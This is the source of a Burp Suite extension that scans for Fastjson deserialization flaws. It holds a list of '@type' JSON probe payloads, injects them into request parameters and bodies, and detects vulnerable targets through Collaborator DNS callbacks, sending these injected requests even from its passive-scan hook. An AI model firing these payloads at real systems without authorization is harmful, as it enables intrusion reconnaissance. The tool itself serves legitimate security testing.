from burp import IBurpExtender
from burp import ITab
from burp import IScannerCheck
from burp import IMessageEditorController
from burp import IParameter
from java.awt import Component;
from java.io import PrintWriter;
from java.util import ArrayList;
from java.util import List;
from javax.swing import JScrollPane;
from javax.swing import JSplitPane;
from javax.swing import JTabbedPane;
from javax.swing import JTable;
from javax.swing import SwingUtilities;
from javax.swing.table import AbstractTableModel;
from threading import Lock
import json,string
import time,random

class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController, AbstractTableModel):
    
    #
    # implement IBurpExtender
    #
    
    def registerExtenderCallbacks(self, callbacks):
        # keep a reference to our callbacks object
        self._callbacks = callbacks
        
        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()
        
        # set our extension name
        callbacks.setExtensionName("fastjson scanner")
        print("Name:\tfastjson scanner\nAuthor:\tp1g3 && change by saline\ntime:\t2020/07/05\nversion:\t1.01")
        
        # create the log and a lock on which to synchronize when adding log entries
        self._log = ArrayList()
        self._lock = Lock()
        
        # main split pane
        self._splitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        
        # table of log entries
        logTable = Table(self)
        scrollPane = JScrollPane(logTable)
        self._splitpane.setLeftComponent(scrollPane)

        # tabs with request/response viewers
        tabs = JTabbedPane()
        self._requestViewer = callbacks.createMessageEditor(self, False)
        self._responseViewer = callbacks.createMessageEditor(self, False)
        tabs.addTab("Request", self._requestViewer.getComponent())
        tabs.addTab("Response", self._responseViewer.getComponent())
        self._splitpane.setRightComponent(tabs)
        self.payloads = [
            """{"rand":{"@type":"java.net.InetAddress","val":"dnslog"}}""",
            """{"rand":{"@type":"java.net.Inet4Address","val":"dnslog"}}""",
            """{"rand":{"@type":"java.net.Inet6Address","val":"dnslog"}}""",
            """{"rand":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}""",
            """{"rand":{"@type":"java.net.URL","val":"http://dnslog"}}""",
            """{"rand":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}""",
            """{"rand":Set[{"@type":"java.net.URL","val":"http://dnslog"}]}""",
            """{"rand":Set[{"@type":"java.net.URL","val":"http://dnslog"}""",
            """{"rand":{"@type":"java.net.URL","val":"http://dnslog"}:0""",
        ]
        
        # customize our UI components
        callbacks.customizeUiComponent(self._splitpane)
        callbacks.customizeUiComponent(logTable)
        callbacks.customizeUiComponent(scrollPane)
        callbacks.customizeUiComponent(tabs)
        
        # add the custom tab to Burp's UI
        callbacks.addSuiteTab(self)
        
        # register ourselves as an HTTP listener
        callbacks.registerScannerCheck(self)

        # id for column
        self.id = 0
        # print("Suucess Load.")
        
        return

    def getTabCaption(self):
        return "FastjsonScanner"

    def rand_str(self,count):
        return ''.join(random.choice(string.letters + string.digits) for i in range(count))

    def getUiComponent(self):
        return self._splitpane

    def doActiveScan(self,baseRequestResponse,insertionPoint):
        pass

    def doPassiveScan(self,baseRequestResponse):
        self.baseRequestResponse = baseRequestResponse
        for payload in self.payloads:
            # service = baseRequestResponse.getHttpService()
            result = self.scancheck(baseRequestResponse,payload)
            if result != [] and result !='' and result != None:
                info,analyze_againRes,param,url = result
                self.id +=1
                #analyze_request = self._helpers.analyzeRequest(service,baseRequestResponse.getRequest())
                self._lock.acquire()
                row = self._log.size()
                self._log.add(LogEntry(self.id,info,baseRequestResponse,param,url))
                self.fireTableRowsInserted(row, row)
                self._lock.release()
        return

    def scancheck(self,baseRequestResponse,payload):
        collaboratorContext = self._callbacks.createBurpCollaboratorClientContext()
        val = collaboratorContext.generatePayload(True)
        payload = payload.replace('dnslog',val)
        fastjson_poc = payload.replace('rand',self.rand_str(6))
        host, port, protocol, method, headers, params, url, reqBodys, analyze_request = self.Get_RequestInfo(baseRequestResponse)
        if method == "GET":
            is_json = False
            str_params = str(params)
            split_params = str_params.split('&')
            replace_params = ''
            json_list = []
            for param in split_params:
                if '=' in param and len(param.split('=')) == 2:
                    key,value = param.split('=')
                    urldecode_value = self._helpers.urlDecode(value)
                    try:
                        if json.loads(urldecode_value) and '{'  in urldecode_value:
                            value = fastjson_poc
                            is_json = True
                            json_list.append(key)
                    except Exception as e:
                        # print(e)
                        pass
                try:
                    replace_params += key + '=' + value + '&'
                except:
                    pass
            replace_params = replace_params[:-1]
            if is_json == True:
                info = ""
                againReq_headers = headers
                againReq_headers[0] = headers[0].replace(params,replace_params)
                for i in range(0,len(againReq_headers)):
                    info = info + againReq_headers[i] + '\n'
                againReq =  self._helpers.buildHttpMessage(againReq_headers,reqBodys)
                if protocol == 'https':
                    is_https = True
                else:
                    is_https = False
                againRes = self._callbacks.makeHttpRequest(host, port, is_https, againReq)
                analyze_againRes = self._helpers.analyzeResponse(againRes)
                time.sleep(10)
                if collaboratorContext.fetchCollaboratorInteractionsFor(val):
                    print("change params success")
                    print(info)
                    return info,analyze_againRes,','.join(json_list),str(url)
            else:
                info = ""
                againReq_headers = headers
                againReq_headers[0] = headers[0].replace('GET','POST')
                againReq_headers.add('Content-Type: application/json')
                for i in range(0,len(againReq_headers)):
                    info = info + againReq_headers[i] + '\n'
                againReq = self._helpers.buildHttpMessage(againReq_headers, fastjson_poc)
                if protocol == 'https':
                    is_https = True
                else:
                    is_https = False
                againRes = self._callbacks.makeHttpRequest(host, port, is_https, againReq)
                analyze_againRes = self._helpers.analyzeResponse(againRes)
                if collaboratorContext.fetchCollaboratorInteractionsFor(val):
                    info = info +'\n' + fastjson_poc
                    print("change method success")
                    print(info)
                    return info,analyze_againRes,'againReq', str(url)

        elif method == "POST":
            json_list = []
            info = ""
            for i in range(0,len(headers)):
                info = info + headers[i] + '\n'
            try: # check reqbody like {"xxx":"xxx"}
                if json.loads(reqBodys) and '{' in reqBodys:
                    body_json = True
                    replace_reqBodys = fastjson_poc
            except:
                #replace_reqBodys = reqBodys
                body_json = False

            if body_json == True:
                againReq = self._helpers.buildHttpMessage(headers, replace_reqBodys)
                if protocol == 'https':
                    is_https = True
                else:
                    is_https = False
                againRes = self._callbacks.makeHttpRequest(host, port, is_https, againReq)
                analyze_againRes = self._helpers.analyzeResponse(againRes)
                time.sleep(10)
                if collaboratorContext.fetchCollaboratorInteractionsFor(val):
                    info = info +'\n' + replace_reqBodys
                    print("change postdata success")
                    print(info)
                    return info,analyze_againRes,'postdata', str(url)
            else: # check reqbody like a=1&b=json_str
                replace_params = ''
                is_json_post = False
                split_body_param = reqBodys.split('&')
                for body_param in split_body_param:
                    if '=' in body_param and len(body_param.split('=')) == 2:
                        post_key, post_value = body_param.split('=')
                        urldecode_value = self._helpers.urlDecode(post_value)
                        try:
                            if json.loads(urldecode_value) and '{' in urldecode_value:
                                post_value = fastjson_poc
                                is_json_post = True
                                json_list.append(post_key)
                        except Exception as e:
                            # print(e)
                            pass
                    try:
                        replace_params += post_key + '=' + post_value + '&'
                    except Exception as e:
                        # print(3)
                        # print(e)
                        pass
                replace_params = replace_params[:-1]
                if is_json_post == True:
                    againReq = self._helpers.buildHttpMessage(headers, replace_params)
                    if protocol == 'https':
                        is_https = True
                    else:
                        is_https = False
                    # print(replace_params)
                    againRes = self._callbacks.makeHttpRequest(host, port, is_https, againReq)
                    analyze_againRes = self._helpers.analyzeResponse(againRes)
                    time.sleep(10)
                    if collaboratorContext.fetchCollaboratorInteractionsFor(val):
                        info = info +'\n' + replace_params
                        print("change postdata params success")
                        print(info)
                        return info,analyze_againRes,','.join(json_list), str(url)
        return []


    def Get_RequestInfo(self,baseRequestResponse):
        """
        extract about service
        """
        service = baseRequestResponse.getHttpService()
        host = service.getHost()
        port = service.getPort()
        protocol = service.getProtocol()
        """
        extract request
        """
        analyze_request = self._helpers.analyzeRequest(service,baseRequestResponse.getRequest())
        reqBodys = baseRequestResponse.getRequest()[analyze_request.getBodyOffset():].tostring()
        url = analyze_request.getUrl()
        headers = analyze_request.getHeaders()
        method = analyze_request.getMethod()
        params = [i for i in analyze_request.getParameters() if i.getType() == IParameter.PARAM_URL]
        extract_params = '&'.join([('%s=%s' % (c.getName(),c.getValue())) for c in params ])

        return host,port,protocol,method,headers,extract_params,url,reqBodys,analyze_request

    def Get_ResponseInfo(self,baseRequestResponse):
        """
        extract response
        """
        analyze_response = self._helpers.analyzeResponse(baseRequestResponse.getResponse())
        status_code = analyze_response.getStatusCode()
        body =  baseRequestResponse.getResponse()[analyze_response.getBodyOffset():].tostring()

        return status_code,body

    def getRowCount(self):
        try:
            return self._log.size()
        except:
            return 0

    def getColumnCount(self):
        return 3

    def getColumnName(self, columnIndex):
        if columnIndex == 0:
            return "ID"
        if columnIndex == 1:
            return "PARAM"
        if columnIndex == 2:
            return "URL"
        return ""

    def getValueAt(self, rowIndex, columnIndex):
        logEntry = self._log.get(rowIndex)
        if columnIndex == 0:
            return logEntry._id
        if columnIndex == 1:
            return logEntry._param
        if columnIndex == 2:
            return logEntry._url
        
        return ""

    #
    # implement IMessageEditorController
    # this allows our request/response viewers to obtain details about the messages being displayed
    #
    
    def getHttpService(self):
        return self._currentlyDisplayedItem.getHttpService()

    def getRequest(self):
        return self._currentlyDisplayedItem.getRequest()

    def getResponse(self):
        return self._currentlyDisplayedItem.getResponse()

#
# extend JTable to handle cell selection
#
    
class Table(JTable):
    def __init__(self, extender):
        self._extender = extender
        self.setModel(extender)
    
    def changeSelection(self, row, col, toggle, extend):
    
        # show the log entry for the selected row
        logEntry = self._extender._log.get(row)
        self._extender._requestViewer.setMessage(logEntry.info, True)
        self._extender._responseViewer.setMessage(logEntry._requestResponse.getResponse(), False)
        self._extender._currentlyDisplayedItem = logEntry._requestResponse
        JTable.changeSelection(self, row, col, toggle, extend)
    
#
# class to hold details of each log entry
#

class LogEntry:
    def __init__(self,record_id,info,requestResponse, param, url):
        self._id = record_id
        self._param = param
        self.info = info
        self._requestResponse = requestResponse
        self._url = url
